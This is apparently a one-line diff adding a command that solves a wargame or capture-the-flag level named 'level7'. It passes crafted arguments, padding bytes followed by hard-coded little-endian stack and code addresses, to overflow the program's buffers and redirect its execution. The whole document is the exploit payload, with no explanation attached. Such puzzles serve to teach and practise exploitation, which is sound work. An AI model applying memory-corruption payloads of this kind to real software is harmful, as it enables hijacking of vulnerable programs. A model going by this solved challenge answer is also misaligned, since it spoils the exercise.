@@ -1,0 +1,1 @@
+./level7 "`python -c 'import sys; sys.stdout.write("B" * 20)'``echo -ne '\x1c\xf7\xff\xbf'`" "`echo -ne 'aaaaaaaaaaaaaaaa\x06\x85\x04\x08'`"
